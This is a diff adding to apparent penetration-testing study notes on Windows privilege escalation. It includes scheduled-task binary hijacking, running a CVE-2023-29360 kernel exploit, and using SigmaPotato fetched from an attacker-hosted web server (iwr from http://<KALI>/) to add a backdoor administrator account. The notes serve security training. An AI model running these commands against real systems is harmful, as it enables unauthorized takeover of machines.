@@ -1278,7 +1278,7 @@ Install Wsgidav (Web Distributed Authoring and Versioning): allow clients to upl
     net user
     net localgroup administrators
     ```
-- Scheduled Tasks
+- Scheduled Tasks  
   - if tasks run as NT AUTHORITY\SYSTEM or as an administrative user, could lead to privilege escalation  
   - diplay all scheduled tasks > \Microsoft\CacheCleanup  
     start In: C:\Users\steve\Pictures. task to run: C:\Users\steve\Pictures\BackendCacheCleanup.exe  
@@ -1291,8 +1291,35 @@ Install Wsgidav (Web Distributed Authoring and Versioning): allow clients to upl
     move .\Pictures\BackendCacheCleanup.exe BackendCacheCleanup.exe.bak
     move .\BackendCacheCleanup.exe .\Pictures\
     ```
-- Using Exploits
-- 
+- Using Exploits  
+  - check current privileges  
+    `whoami /priv`
+  - enumerate windows version and security patches  
+    `systeminfo` `Get-CimInstance -Class win32_quickfixengineering | Where-Object { $_.Description -eq "Security Update" }`
+  - Locate the kernel exploit [CVE-2023-29360](https://github.com/sickn3ss/exploits/tree/master/CVE-2023-29360/x64/Release)  
+    `cd .\Desktop\` `dir` `CVE-2023-29360.exe`
+  - Elevating our privileges to SYSTEM > nt authority\system  
+    `whoami` `.\CVE-2023-29360.exe` `whoami`
+  - list of abuse privilege: SeImpersonatePrivilege, SeBackupPrivilege, SeAssignPrimaryToken, SeLoadDriver, SeDebug  
+  - [SigmaPotato](https://github.com/tylerdotrar/SigmaPotato): use as a user with the privilege SeImpersonatePrivilege to execute commands or obtain an interactive shell as NT AUTHORITY\SYSTEM  
+  - Download SigmaPotato.exe and server it with a Python3 web server  
+    ```
+    nc 192.168.50.220 4444
+    whoami /priv
+
+    wget https://github.com/tylerdotrar/SigmaPotato/releases/download/v1.2.6/SigmaPotato.exe
+    python3 -m http.server 80
+
+    #Target machine
+    C:\Users\dave> powershell
+    iwr -uri http://<KALI>/SigmaPotato.exe -OutFile SigmaPotato.exe
+    ```
+  - Use SigmaPotato tool to add a new user to the Admin localgroup  
+    ```
+    .\SigmaPotato "net user dave4 lab /add"
+    .\SigmaPotato "net localgroup Administrators dave4 /add"
+    ```
+    
 ### 18. Linux privilege escalation
 ### 19. Port redirection and SSH tunneling
 ### 20. Tunneling through deep packet inspectation
